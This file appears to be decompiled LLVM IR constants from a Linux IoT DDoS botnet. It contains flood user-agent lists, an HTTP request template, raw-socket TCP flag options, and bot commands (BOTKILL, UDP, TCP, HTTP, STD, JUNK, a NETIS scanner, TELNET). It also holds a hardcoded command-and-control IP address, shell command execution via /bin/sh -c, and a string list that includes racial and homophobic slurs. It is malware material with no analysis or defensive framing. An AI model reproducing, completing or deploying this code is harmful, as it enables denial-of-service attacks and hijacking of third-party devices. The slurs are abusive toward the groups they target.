@global_var_1d85c.630 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_1d874.631 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_1d8cc.632 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_1d96c.633 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_1d9c0.634 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_1da34.635 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_1da74.636 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_1db2c.637 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_1db80.638 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_1dbd8.639 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_1dc30.640 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_1dc70.641 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_1dcb8.642 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_1dd10.643 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_1dd7c.644 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_1ddd4.645 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_1de24.646 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_1de48.647 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_1dea4.648 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_1deb4.649 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_1dee4.650 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_1df08.651 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_1df2c.652 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_1df48.653 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_1df88.654 = constant [140 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1e014.655 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1e05c.656 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1e0a4.657 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1e0ec.658 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_1e134.659 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_1e188.660 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_1e1d8.661 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_1e244.662 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_1e298.663 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_1e2f4.664 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_1e350.665 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_1e3b4.666 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_1e410.667 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1e46c.668 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1e4c8.669 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_1e528.670 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_1e570.671 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_1e608.672 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_1e654.673 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_1e6a0.674 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_1e6f0.675 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_1e738.676 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_1e78c.677 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_1e7dc.678 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_1e824.679 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_1e870.680 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_1e8bc.681 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_1e904.682 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_1e954.683 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_1e9a4.684 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_1e9d8.685 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_1ea0c.686 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_1ea54.687 = constant [62 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_1d6f4.625, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1d734.626, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_1d774.627, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_1d804.628, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_1d83c.629, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1d85c.630, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_1d874.631, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_1d8cc.632, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_1d96c.633, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_1d9c0.634, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_1da34.635, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_1da74.636, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_1db2c.637, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_1db80.638, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_1dbd8.639, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_1dc30.640, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1dc70.641, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_1dcb8.642, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @global_var_1dd10.643, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @global_var_1dd7c.644, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_1ddd4.645, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_1de24.646, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @global_var_1de48.647, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_1dea4.648, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @global_var_1deb4.649, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @global_var_1dee4.650, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @global_var_1df08.651, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @global_var_1df2c.652, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @global_var_1df48.653, i32 0, i32 0), i8* getelementptr inbounds ([140 x i8], [140 x i8]* @global_var_1df88.654, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1e014.655, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1e05c.656, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1e0a4.657, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @global_var_1e0ec.658, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_1e134.659, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_1e188.660, i32 0, i32 0), i8* getelementptr inbounds ([105 x i8], [105 x i8]* @global_var_1e1d8.661, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @global_var_1e244.662, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1e298.663, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1e2f4.664, i32 0, i32 0), i8* getelementptr inbounds ([97 x i8], [97 x i8]* @global_var_1e350.665, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1e3b4.666, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1e410.667, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @global_var_1e46c.668, i32 0, i32 0), i8* getelementptr inbounds ([96 x i8], [96 x i8]* @global_var_1e4c8.669, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_1e528.670, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @global_var_1e570.671, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_1e608.672, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1e654.673, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @global_var_1e6a0.674, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_1e6f0.675, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @global_var_1e738.676, i32 0, i32 0), i8* getelementptr inbounds ([79 x i8], [79 x i8]* @global_var_1e78c.677, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @global_var_1e7dc.678, i32 0, i32 0), i8* getelementptr inbounds ([74 x i8], [74 x i8]* @global_var_1e824.679, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @global_var_1e870.680, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @global_var_1e8bc.681, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_1e904.682, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @global_var_1e954.683, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_1e9a4.684, i32 0, i32 0), i8* getelementptr inbounds ([51 x i8], [51 x i8]* @global_var_1e9d8.685, i32 0, i32 0), i8* getelementptr inbounds ([72 x i8], [72 x i8]* @global_var_1ea0c.686, i32 0, i32 0)]
@global_var_1d6cc.689 = constant [6 x i8] c"close\00"
@global_var_1d6d4.690 = constant [11 x i8] c"keep-alive\00"
@global_var_1d6e0.691 = constant [7 x i8] c"accept\00"
@global_var_1d6e8.692 = constant [3 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1d6cc.689, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1d6d4.690, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1d6e0.691, i32 0, i32 0)]
@global_var_1eb4c.696 = constant [62 x i8] c"%s %s HTTP/1.1\0D\0AConnection: %s\0D\0AAccept: */*\0D\0AUser-Agent: %s\0D\0A\00"
@global_var_1eb8c.698 = constant [6 x i8] c"arfgG\00"
@global_var_1eb94.699 = constant [9 x i8] c"HBiug655\00"
@global_var_1eba0.700 = constant [13 x i8] c"KJYDFyljf754\00"
@global_var_1ebb0.701 = constant [20 x i8] c"LIKUGilkut769458905\00"
@global_var_1ebc4.702 = constant [17 x i8] c"JHFDSkgfc5747694\00"
@global_var_1ebd8.703 = constant [12 x i8] c"GJjyur67458\00"
@global_var_1ebe4.704 = constant [12 x i8] c"RYSDk747586\00"
@global_var_1ebf0.705 = constant [12 x i8] c"HKJGi5r8675\00"
@global_var_1ebfc.706 = constant [10 x i8] c"KHGK7985i\00"
@global_var_1ec08.707 = constant [11 x i8] c"yuituiILYF\00"
@global_var_1ec14.708 = constant [14 x i8] c"GKJDghfcjkgd4\00"
@global_var_1ec24.709 = constant [12 x i8] c"uygtfgtrevf\00"
@global_var_1ec30.710 = constant [13 x i8] c"tyeuhygbtfvg\00"
@global_var_1ec40.711 = constant [9 x i8] c"ewqdcftr\00"
@global_var_1ec4c.712 = constant [16 x i8] c"trbazetghhnbrty\00"
@global_var_1ec5c.713 = constant [11 x i8] c"tbhrwsehbg\00"
@global_var_1ec68.714 = constant [12 x i8] c"twehgbferhb\00"
@global_var_1ec74.715 = constant [12 x i8] c"etrbhhgetrb\00"
@global_var_1ec80.716 = constant [14 x i8] c"edfverthbyrtb\00"
@global_var_1ec90.717 = constant [14 x i8] c"kmiujmnhnhfgn\00"
@global_var_1eca0.718 = constant [14 x i8] c"zcdbvgdfsbgfd\00"
@global_var_1ecb0.719 = constant [10 x i8] c"gdfbtsdgb\00"
@global_var_1ecbc.720 = constant [14 x i8] c"ghdugffytsdyt\00"
@global_var_1eccc.721 = constant [14 x i8] c"tgerthgwtrwry\00"
@global_var_1ecdc.722 = constant [12 x i8] c"yteytietyue\00"
@global_var_1ece8.723 = constant [9 x i8] c"qsortEQS\00"
@global_var_1ecf4.724 = constant [16 x i8] c"8969876hjkghblk\00"
@global_var_1ed04.725 = constant [4 x i8] c"std\00"
@global_var_1ed08.726 = constant [4 x i8] c"dts\00"
@global_var_1ed0c.727 = constant [6 x i8] c"hackz\00"
@global_var_1ed14.728 = constant [7 x i8] c"shdyed\00"
@global_var_1ed1c.729 = constant [5 x i8] c"http\00"
@global_var_1ed24.730 = constant [10 x i8] c"sghwiondc\00"
@global_var_1ed30.731 = constant [7 x i8] c"nigger\00"
@global_var_1ed38.732 = constant [6 x i8] c"pussy\00"
@global_var_1ed40.733 = constant [7 x i8] c"faggot\00"
@global_var_1ed48.734 = constant [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1eb8c.698, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1eb94.699, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1eba0.700, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @global_var_1ebb0.701, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_1ebc4.702, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ebd8.703, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ebe4.704, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ebf0.705, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ebfc.706, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ec08.707, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1ec14.708, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ec24.709, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1ec30.710, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ec40.711, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1ec4c.712, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1ec5c.713, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ec68.714, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ec74.715, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1ec80.716, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1ec90.717, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1eca0.718, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ecb0.719, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1ecbc.720, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_1eccc.721, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_1ecdc.722, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1ece8.723, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1ecf4.724, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed04.725, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1ed08.726, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ed0c.727, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ed14.728, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1ed1c.729, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ed24.730, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ed30.731, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1ed38.732, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1ed40.733, i32 0, i32 0)]
@global_var_1edd8.737 = constant [27 x i8] c"Failed opening raw socket.\00"
@global_var_1edf4.739 = constant [33 x i8] c"Failed setting raw headers mode.\00"
@global_var_1ee18.744 = constant [4 x i8] c"all\00"
@global_var_1ee1c.746 = constant i32 44
@global_var_1ee20.748 = constant [4 x i8] c"syn\00"
@global_var_1ee24.750 = constant [4 x i8] c"rst\00"
@global_var_1ee28.752 = constant [4 x i8] c"fin\00"
@global_var_1ee2c.754 = constant [4 x i8] c"ack\00"
@global_var_1ee30.756 = constant [4 x i8] c"psh\00"
@global_var_1ee34.758 = constant [18 x i8] c"Invalid flag \22%s\22\00"
@global_var_1ee48.762 = constant [6 x i8] c"PONG!\00"
@global_var_1ee50.764 = constant [11 x i8] c"GETLOCALIP\00"
@global_var_1ee5c.767 = constant [10 x i8] c"My IP: %s\00"
@global_var_1ee68.769 = constant [8 x i8] c"BOTKILL\00"
@global_var_1ee70.771 = constant [13 x i8] c"Killing Bots\00"
@global_var_1ee80.773 = constant [7 x i8] c"LOOPME\00"
@global_var_1ee88.775 = constant [16 x i8] c"LOOPING PAYLOAD\00"
@global_var_1ee98.777 = constant [7 x i8] c"TELNET\00"
@global_var_1eea0.779 = constant [16 x i8] c"TELNET ON | OFF\00"
@global_var_1eeb0.781 = constant [4 x i8] c"OFF\00"
@global_var_2eec4.783 = global i32 0
@global_var_1eeb4.785 = constant [5 x i8] c" OFF\00"
@global_var_1eebc.787 = constant [3 x i8] c"ON\00"
@global_var_1eec0.789 = constant [6 x i8] c"NETIS\00"
@global_var_1eec8.791 = constant [25 x i8] c"[NETIS] SCANNER Starting\00"
@global_var_1eee4.793 = constant [5 x i8] c"HOLD\00"
@global_var_1eeec.796 = constant [5 x i8] c"JUNK\00"
@global_var_1eef4.798 = constant [4 x i8] c"UDP\00"
@global_var_1eef8.800 = constant [5 x i8] c"HTTP\00"
@global_var_1ef00.802 = constant [4 x i8] c"CNC\00"
@global_var_1ef04.804 = constant [6 x i8] c"COMBO\00"
@global_var_1ef0c.806 = constant [4 x i8] c"STD\00"
@global_var_1ef10.808 = constant [4 x i8] c"TCP\00"
@global_var_1ef14.810 = constant [5 x i8] c"STOP\00"
@global_var_1ef1c.814 = constant [12 x i8] c"HOODASSSHIT\00"
@global_var_287d4.817 = local_unnamed_addr global i32 -1
@global_var_1bde8.819 = constant [16 x i8] c"188.213.170.176\00"
@global_var_2873c.820 = global [16 x i8]* @global_var_1bde8.819
@global_var_28740.822 = local_unnamed_addr global i32 47
@global_var_1ef28.824 = constant [8 x i8] c"8.8.8.8\00"
@global_var_1ef30.827 = constant [16 x i8] c"/proc/net/route\00"
@global_var_1ef40.829 = constant [11 x i8] c"\0900000000\09\00"
@global_var_28c50.831 = global i32 0
@global_var_1ef4c.833 = constant [16 x i8] c"/usr/bin/python\00"
@global_var_1ef5c.835 = constant [7 x i8] c"SERVER\00"
@global_var_1ef64.837 = constant [7 x i8] c"ROUTER\00"
@global_var_1ef6c.839 = constant i32 0
@global_var_1ef70.842 = constant [5 x i8] c"sshd\00"
@global_var_1ef78.844 = constant [19 x i8] c"/usr/sbin/dropbear\00"
@global_var_287d0.846 = global i32 1
@global_var_1ef8c.849 = constant [13 x i8] c"BUILD %s:%s\0A\00"
@global_var_1ef9c.851 = constant i32 47
@global_var_1efe4.854 = constant [8 x i8] c"Love <3\00"
@global_var_1efa0.856 = constant i32 993090331
@global_var_1efec.861 = constant [5 x i8] c"PONG\00"
@global_var_1eff4.863 = constant [4 x i8] c"DUP\00"
@global_var_1eff8.865 = constant [5 x i8] c"MOVE\00"
@global_var_1f000.867 = constant [8 x i8] c"%s 2>&1\00"
@1 = constant [3 x i32] %wide-string
@global_var_1f00c.871 = constant i32 32
@global_var_288c8 = external global i32
@global_var_288d0 = external local_unnamed_addr global i32
@global_var_2ee94.881 = global i32 0
@global_var_1f610.886 = constant i32 0
@global_var_288ec.888 = global i32 0
@global_var_28904.890 = global i32 0
@global_var_288e8.892 = global i32* bitcast (i8** @global_var_28920.876 to i32*)
@global_var_146e4.895 = constant i32 -382910448
@global_var_17db0.896 = constant i32 -382909968
@global_var_17e6c.901 = constant i32 -382910224
@global_var_1f644.903 = constant i32 135270416
@global_var_1f628.905 = constant [6 x i8] c"(nil)\00"
@global_var_1f630.908 = constant [7 x i8] c"(null)\00"
@global_var_1f638.910 = constant i32 2949163
@global_var_1f6c4.913 = constant i32 16843008
@global_var_1f6ac.915 = constant i32 327688
@global_var_1f6a4.920 = constant [8 x i8] c" +0-#'I\00"
@global_var_1f64c.922 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_1f68c.924 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_1f67f.926 = constant i32 117506048
@global_var_1f680.928 = constant i32 252117248
@global_var_1f670.930 = constant i32 331776
@global_var_1f660.932 = constant i32 335616
@global_var_1578c.933 = constant i32 -456978431
@global_var_1f6e0.939 = constant [8 x i8] c"Success\00"
@global_var_1f6d0.941 = constant [15 x i8] c"Unknown error \00"
@global_var_2041a.943 = constant i32 65536
@global_var_28c04.944 = global i32* @global_var_2041a.943
@global_var_2ec68.946 = global i32 0
@global_var_202c4.949 = constant [15 x i8] c"Resolver error\00"
@global_var_20244.951 = constant [8 x i8] c"Error 0\00"
@global_var_2024c.952 = constant [13 x i8] c"Unknown host\00"
@global_var_2025c.953 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_20278.954 = constant [21 x i8] c"Unknown server error\00"
@global_var_20290.955 = constant [32 x i8] c"No address associated with name\00"
@global_var_202b0.956 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_20244.951, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_2024c.952, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_2025c.953, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_20278.954, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_20290.955, i32 0, i32 0)]
@global_var_202d4.958 = constant [3 x i8] c": \00"
@global_var_202d6.960 = constant i32 0
@global_var_288dc = external local_unnamed_addr global i32
@global_var_2023c.965 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_2ec6c.967 = global i32 0
@global_var_2ee48.969 = global i32 0
@global_var_2ec7c.971 = global i32 0
@global_var_28c0c.973 = global i32 0
@global_var_2ef80.978 = global i32 0
@global_var_2ef74.981 = global i32 0
@global_var_2eecc.983 = global i32 0
@global_var_2ee5c.985 = global i32 0
@global_var_28b0c.988 = global i32 256
@global_var_28a10.989 = global i32* @global_var_28b0c.988
@global_var_2ee84.992 = global i32 0
@global_var_2ef4c.994 = global i32 0
@global_var_17bc4.995 = constant i32 -382910416
@global_var_16834.1002 = constant i32 -442564520
@global_var_28b18.1004 = global i32 0
@global_var_14350.1006 = constant i32 -481230848
@global_var_2ee74.1008 = global i32 0
@global_var_13fd4.1010 = constant i32 -509587456
@global_var_28b30.1012 = global i32 0
@global_var_28b48 = external global i32
@global_var_28b68.1018 = global i32 -1726662223
@global_var_28b50.1025 = local_unnamed_addr global i32* @global_var_28b68.1018
@global_var_28b4c.1027 = global i32* @global_var_28b68.1018
@global_var_202d8.1041 = constant i32 0
@global_var_1f31d.1045 = constant i32 -1996519425
@global_var_20300.1049 = constant [8 x i8] c"/bin/sh\00"
@global_var_20308.1051 = constant [3 x i8] c"sh\00"
@global_var_2030c.1053 = constant [3 x i8] c"-c\00"
@global_var_28be4.1057 = global i32 0
@global_var_2ee78.1061 = local_unnamed_addr global i32 0
@global_var_1462c.1064 = constant i32 -382910416
@global_var_2ee80.1066 = global i32 0
@global_var_28718.1069 = global i32 -1
@global_var_2ee88.1072 = global i32 0
@global_var_2ee8c.1074 = local_unnamed_addr global i32 0
@global_var_176b4.1075 = constant i32 -390234096
@global_var_20310.1077 = constant [10 x i8] c"/dev/null\00"
